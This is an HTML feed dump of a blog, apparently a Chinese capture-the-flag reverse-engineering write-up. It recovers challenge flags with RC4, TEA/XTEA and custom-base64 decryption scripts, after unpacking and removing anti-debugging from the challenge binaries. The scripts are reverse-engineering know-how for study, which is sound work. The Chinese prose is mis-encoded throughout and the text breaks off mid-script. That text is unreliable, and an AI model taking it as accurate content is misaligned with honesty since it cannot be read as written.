class="line">        <span class="built_in">print</span>(<span class="string">&#x27;good&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(hex_output)</span><br><span class="line">last = [<span class="number">0x18</span>,<span class="number">0xfa</span>,<span class="number">0xad</span>,<span class="number">0x64</span>,<span class="number">0xed</span>,<span class="number">0xab</span>,<span class="number">0xad</span>,<span class="number">0x9d</span>,<span class="number">0xe5</span>,<span class="number">0xc0</span>,<span class="number">0xad</span>,<span class="number">0xfa</span>,<span class="number">0xf9</span>,<span class="number">0x0b</span>,<span class="number">0x65</span>,<span class="number">0xf9</span>,<span class="number">0xe5</span>,<span class="number">0xad</span>,<span class="number">0x65</span>,<span class="number">0x36</span>,<span class="number">0xf9</span>,<span class="number">0xfd</span>,<span class="number">0x88</span>,<span class="number">0xf9</span>,<span class="number">0x9d</span>,<span class="number">0xe5</span>,<span class="number">0x9c</span>,<span class="number">0xe5</span>,<span class="number">0x9d</span>,<span class="number">0x65</span>,<span class="number">0xc3</span>,<span class="number">0x29</span>,<span class="number">0x29</span>,<span class="number">0x0f</span>,<span class="number">0xff</span>]</span><br><span class="line">okey = generate_key(<span class="built_in">len</span>(last))</span><br><span class="line">q = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">        <span class="keyword">if</span> okey[j]^<span class="number">95</span>==last[i]:</span><br><span class="line">            q.append(j)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">pl(q)</span><br></pre></td></tr></table></figure><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;mar3hal_Is_3asy_t0_r3v3rse!!@&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="ASM">ASM</h2><p>é…ç½®VS asmç¯å¢ƒï¼Œæˆ‘çš„VSç‰ˆæœ¬ä¸º2022</p><p>CSDNä¸Šé¢å†™çš„å¤ªæŠ½è±¡äº†ï¼Œæˆ‘åœ¨<a href="https://zjlc.top/2022/05/11/assembly/">Windowså¹³å°ç¼–å†™æ±‡ç¼–è¯­è¨€</a>çœ‹åˆ°äº†ä¸€ä¸ªä¸é”™çš„</p><p>å¤§æ¦‚æ­¥éª¤å°±æ˜¯ï¼š</p><ul><li><a href="http://www.masm32.com/download.htm">Download The MASM32 SDK</a>ä¸‹è½½MASM SDK</li><li>åœ¨VS installer é‡Œé¢ä¸‹è½½MSVC V140 ç”Ÿæˆå·¥å…·ï¼Œv141 ç¼“è§£åº“ï¼Œv141 ARMç”Ÿæˆå·¥å…·</li></ul><h2 id="æ‚é¡¹ï¼š">æ‚é¡¹ï¼š</h2><p><a href="https://www.pri87.vip/posts/ab9e1965.html">gitåŸºæœ¬æ“ä½œ</a></p><p><a href="https://www.pri87.vip/posts/484c947.html">golangå­¦ä¹ </a></p>]]></content>
      
      
      <categories>
          
          <category> å®è·µ </category>
          
          <category> è®°å½• </category>
          
          <category> æ—¥å¸¸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”¾å‡ </tag>
            
            <tag> å¼€æ‘† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024æ˜¥ç§‹æ¯å¤ re wp</title>
      <link href="/posts/1cdc16cf.html"/>
      <url>/posts/1cdc16cf.html</url>
      
        <content type="html"><![CDATA[<h1>RE</h1><h2 id="snack">snack</h2><p>pycè§£åŒ…ï¼Œpycdcåç¼–è¯‘ï¼Œå¾—åˆ°ä¸€ä¸ªrc4åŠ å¯†ï¼Œå¤åˆ¶åŠ å¯†è¿‡ç¨‹ç›´æ¥è§£å¯†å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pl</span>(<span class="params">a, b=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">0</span> &lt;= x &lt;= <span class="number">255</span> <span class="keyword">for</span> x <span class="keyword">in</span> a):</span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(a[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = (<span class="string">&#x27;&#x27;</span>.join([long_to_bytes(a[i]).decode() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>)]))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> b <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> result.startswith(b):</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">in</span> result <span class="keyword">and</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;b&#125;</span><span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;b&#125;</span>&#123;&#123;<span class="subst">&#123;result&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">key</span>):</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">        S[i],S[j] = S[j],S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_stream</span>(<span class="params">S, length</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    key_stream = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i],S[j] = S[j],S[i]</span><br><span class="line">        key_stream.append(S[(S[i] + S[j]) % <span class="number">256</span>])</span><br><span class="line">    <span class="keyword">return</span> key_stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    S = initialize(key)</span><br><span class="line">    key_stream = generate_key_stream(S, <span class="built_in">len</span>(data))</span><br><span class="line">    decrypted_data = [i^ data[i] ^ key_stream[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))]</span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line">data = [</span><br><span class="line">    <span class="number">101</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">218</span>,</span><br><span class="line">    <span class="number">172</span>,</span><br><span class="line">    <span class="number">205</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="number">235</span>,</span><br><span class="line">    <span class="number">195</span>,</span><br><span class="line">    <span class="number">72</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">130</span>,</span><br><span class="line">    <span class="number">103</span>,</span><br><span class="line">    <span class="number">213</span>,</span><br><span class="line">    <span class="number">120</span>,</span><br><span class="line">    <span class="number">227</span>,</span><br><span class="line">    <span class="number">193</span>,</span><br><span class="line">    <span class="number">67</span>,</span><br><span class="line">    <span class="number">174</span>,</span><br><span class="line">    <span class="number">71</span>,</span><br><span class="line">    <span class="number">162</span>,</span><br><span class="line">    <span class="number">248</span>,</span><br><span class="line">    <span class="number">244</span>,</span><br><span class="line">    <span class="number">12</span>,</span><br><span class="line">    <span class="number">238</span>,</span><br><span class="line">    <span class="number">92</span>,</span><br><span class="line">    <span class="number">160</span>,</span><br><span class="line">    <span class="number">203</span>,</span><br><span class="line">    <span class="number">185</span>,</span><br><span class="line">    <span class="number">155</span>]</span><br><span class="line">xor_key = <span class="string">&#x27;V3rY_v3Ry_Ez&#x27;</span></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xor_key)):</span><br><span class="line">    key.append(<span class="built_in">ord</span>(xor_key[i]))</span><br><span class="line">pl(decrypt(data, key))</span><br><span class="line"><span class="comment"># flag&#123;KMLTz3lT_MePUDa7A_P5LpzCBT&#125;</span></span><br></pre></td></tr></table></figure><h2 id="HardSignin">HardSignin</h2><p>å…ˆå»ä¸€ä¸ªupx</p><p>æœ‰4ä¸ªtlsï¼Œé‡Œé¢æœ‰èŠ±å’Œåè°ƒï¼Œå»èŠ±æ€åè°ƒï¼Œä¼¼ä¹æ˜¯ç”¨éšæœºæ•°ç”Ÿæˆä¹‹ååŠ å¯†ç”¨çš„å‚æ•°ï¼ŒåŒæ—¶å¯¹mainè§£å¯†</p><p><img src="https://s2.loli.net/2024/07/06/372SLiaWRdXwg8y.png" alt="image-20240706182721253"></p><p><img src="https://s2.loli.net/2024/07/06/CpvJHoiGXSOcxrA.png" alt="image-20240706195234707"></p><p><img src="https://s2.loli.net/2024/07/06/oarzEjK6tcLyWxD.png" alt="image-20240706195330050"></p><p>åœ¨tls2é‡Œé¢ä¸‹æ–­ç‚¹åˆ°è¿™é‡Œå·²ç»ç”Ÿæˆçš„æ•°æ®</p><p>mainé‡Œé¢3ä¸ªæ­¥éª¤</p><p><img src="https://s2.loli.net/2024/07/06/igZvC3mJDLPh1Xr.png" alt="image-20240706182810516"></p><p>base64ï¼Œrc4å’Œteaç›´æ¥åå‘è§£å¯†å°±å¥½</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">BYTE S[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decTEA</span><span class="params">(<span class="type">unsigned</span>* target, <span class="type">unsigned</span>* key)</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v5;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">v6 = target[i];</span><br><span class="line">v5 = target[i + <span class="number">1</span>];</span><br><span class="line">sum = <span class="number">0</span> - <span class="number">0x61C88647</span> * <span class="number">0x64</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x64</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line">v5 -= (key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ (v6 + ((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)));</span><br><span class="line">sum += <span class="number">0x61C88647</span>;</span><br><span class="line">v6 -= (key[sum &amp; <span class="number">3</span>] + sum) ^ (v5 + ((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">target[i] = v6;</span><br><span class="line">target[i + <span class="number">1</span>] = v5;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//void __cdecl sub_A71A10(unsigned int round, DWORD* target, DWORD* key)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//unsigned int j; // [esp+4Ch] [ebp-18h]</span></span><br><span class="line"><span class="comment">//unsigned int sum; // [esp+54h] [ebp-10h]</span></span><br><span class="line"><span class="comment">//unsigned int v5; // [esp+58h] [ebp-Ch]</span></span><br><span class="line"><span class="comment">//unsigned int v6; // [esp+5Ch] [ebp-8h]</span></span><br><span class="line"><span class="comment">//int i; // [esp+60h] [ebp-4h]</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//for (i = 0; i &lt; 16; i += 2)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v6 = target[i];</span></span><br><span class="line"><span class="comment">//v5 = target[i + 1];</span></span><br><span class="line"><span class="comment">//sum = 0;</span></span><br><span class="line"><span class="comment">//for (j = 0; j &lt; round; ++j)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v6 += (key[sum &amp; 3] + sum) ^ (v5 + ((v5 &gt;&gt; 5) ^ (16 * v5)));</span></span><br><span class="line"><span class="comment">//sum -= 0x61C88647;</span></span><br><span class="line"><span class="comment">//v5 += (key[(sum &gt;&gt; 11) &amp; 3] + sum) ^ (v6 + ((v6 &gt;&gt; 5) ^ (16 * v6)));</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//target[i] = v6;</span></span><br><span class="line"><span class="comment">//target[i + 1] = v5;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">swap</span><span class="params">(BYTE* a1, BYTE* a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> v2; <span class="comment">// [esp+4Fh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">v2 = *a1;</span><br><span class="line">*a1 = *a2;</span><br><span class="line">*a2 = v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">Sini</span><span class="params">(BYTE* a1, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> k; <span class="comment">// [esp+4Ch] [ebp-114h]</span></span><br><span class="line"><span class="type">int</span> v3; <span class="comment">// [esp+50h] [ebp-110h]</span></span><br><span class="line"><span class="type">int</span> j; <span class="comment">// [esp+54h] [ebp-10Ch]</span></span><br><span class="line"><span class="type">char</span> v5[<span class="number">256</span>]; <span class="comment">// [esp+58h] [ebp-108h] BYREF</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [esp+158h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i)</span><br><span class="line">S[i] = i;</span><br><span class="line"><span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="built_in">sizeof</span>(v5));</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j)</span><br><span class="line">v5[j] = a1[j % len];</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">256</span>; ++k)</span><br><span class="line">&#123;</span><br><span class="line">v3 = ((<span class="type">unsigned</span> __int8)v5[k] + v3 + (<span class="type">unsigned</span> __int8)S[k]) % <span class="number">256</span>;</span><br><span class="line"><span class="built_in">swap</span>(&amp;S[k], &amp;S[v3]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">decrc4</span><span class="params">(BYTE* target, <span class="type">int</span> len, <span class="type">unsigned</span> <span class="type">char</span>* a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [esp+4Ch] [ebp-14h]</span></span><br><span class="line"><span class="type">int</span> v6; <span class="comment">// [esp+54h] [ebp-Ch]</span></span><br><span class="line"><span class="type">int</span> v7; <span class="comment">// [esp+58h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">v7 = <span class="number">0</span>;</span><br><span class="line">v6 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">Sini</span>(a3, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">&#123;</span><br><span class="line">v7 = (v7 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">v6 = (v6 + (<span class="type">unsigned</span> __int8)S[v7]) % <span class="number">256</span>;</span><br><span class="line"><span class="built_in">swap</span>(&amp;S[v7], &amp;S[v6]);</span><br><span class="line">target[i] ^= S[((<span class="type">unsigned</span> __int8)S[v6] + (<span class="type">unsigned</span> __int8)S[v7]) % <span class="number">256</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> last[<span class="number">64</span>] = &#123;</span><br><span class="line"><span class="number">0x59</span>, <span class="number">0x1B</span>, <span class="number">0xFD</span>, <span class="number">0xB4</span>, <span class="number">0x6B</span>, <span class="number">0xB8</span>, <span class="number">0xBE</span>, <span class="number">0xD9</span>, <span class="number">0xB3</span>, <span class="number">0xD3</span>, <span class="number">0x77</span>, <span class="number">0xD6</span>, <span class="number">0xF0</span>, <span class="number">0x65</span>, <span class="number">0x5F</span>, <span class="number">0x18</span>,</span><br><span class="line"><span class="number">0xA0</span>, <span class="number">0x9D</span>, <span class="number">0x3A</span>, <span class="number">0x53</span>, <span class="number">0x6D</span>, <span class="number">0x4A</span>, <span class="number">0x7B</span>, <span class="number">0x26</span>, <span class="number">0x74</span>, <span class="number">0x3A</span>, <span class="number">0x9C</span>, <span class="number">0x4E</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x19</span>, <span class="number">0xD8</span>,</span><br><span class="line"><span class="number">0x72</span>, <span class="number">0xED</span>, <span class="number">0x95</span>, <span class="number">0xB5</span>, <span class="number">0x9C</span>, <span class="number">0x05</span>, <span class="number">0x22</span>, <span class="number">0x56</span>, <span class="number">0xCB</span>, <span class="number">0x7A</span>, <span class="number">0x11</span>, <span class="number">0x91</span>, <span class="number">0x9F</span>, <span class="number">0x7A</span>, <span class="number">0xBC</span>, <span class="number">0x0C</span>,</span><br><span class="line"><span class="number">0x4A</span>, <span class="number">0x69</span>, <span class="number">0x6D</span>, <span class="number">0xCE</span>, <span class="number">0x3D</span>, <span class="number">0xB4</span>, <span class="number">0xAB</span>, <span class="number">0x29</span>, <span class="number">0x61</span>, <span class="number">0xFA</span>, <span class="number">0x62</span>, <span class="number">0x32</span>, <span class="number">0xB4</span>, <span class="number">0xEC</span>, <span class="number">0x4C</span>, <span class="number">0xB6</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x0CAA5BDD</span>, <span class="number">0xD6846924</span>, <span class="number">0x51041EB8</span>, <span class="number">0x8B2AAB06</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">decTEA</span>((<span class="type">unsigned</span>*)last, key);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ikey[<span class="number">16</span>] = &#123;</span><br><span class="line"><span class="number">0x76</span>, <span class="number">0x89</span>, <span class="number">0x33</span>, <span class="number">0x49</span>, <span class="number">0x19</span>, <span class="number">0x13</span>, <span class="number">0xC3</span>, <span class="number">0xC7</span>, <span class="number">0xAD</span>, <span class="number">0xD8</span>, <span class="number">0xE4</span>, <span class="number">0x68</span>, <span class="number">0xFC</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0xBC</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">decrc4</span>(last, <span class="number">64</span>, ikey);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; (<span class="type">unsigned</span> <span class="type">char</span>)last[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// C+vFCnHRGPghbmyQMXvFMRNd7fNCG8jcU+jcbnjRJTj2GTCOGUvgtOS0CTge7fNs</span></span><br></pre></td></tr></table></figure><p>å¯¹ç€ç è¡¨ç›´æ¥è§£å¯†</p><p>4yZRiNP8LoK/GSA5ElWkUjXtJCz7bMYcuFfpm6+hV0rxeHIdwv32QOTnqg1BDsa9</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;C0ngr<span class="meta">@tulat</span>1<span class="keyword">on</span>!Y0u_Re_suCces3fu1Ly_Signln!&#125;</span><br></pre></td></tr></table></figure><h2 id="bedTEA">bedTEA</h2><p>è§‚å¯Ÿmainé€»è¾‘ï¼Œå…ˆç”¨ä¸€ä¸ªå¥‡æ€ªç®—æ³•ç”Ÿæˆäº†keyï¼Œç„¶åæ‰§è¡ŒXTEAåŠ å¯†ï¼Œä¸€å…±ä¸‰æ¬¡ï¼Œè¿™é‡Œæ²¡çœ‹æ‡‚å¥‡æ€ªç®—æ³•æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯å¥½åƒè·Ÿè¾“å…¥æ— å…³ï¼Œäºæ˜¯å°è¯•åŠ¨è°ƒï¼Œå‡ºæ¥åå‘ç°æ˜¯æ–æ³¢é‚£å¥‘æ•°åˆ—ï¼Œç”¨è¿™ä¸ªå†™teaè„šæœ¬</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">may_ini</span><span class="params">(DWORD* input, DWORD* key_array)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> key_index; <span class="comment">// å¯¹åº”äºåŸä»£ç ä¸­çš„ v1</span></span><br><span class="line"><span class="type">int</span> key_end; <span class="comment">// å¯¹åº”äºåŸä»£ç ä¸­çš„ v3</span></span><br><span class="line"><span class="type">int</span> temp_key_index; <span class="comment">// 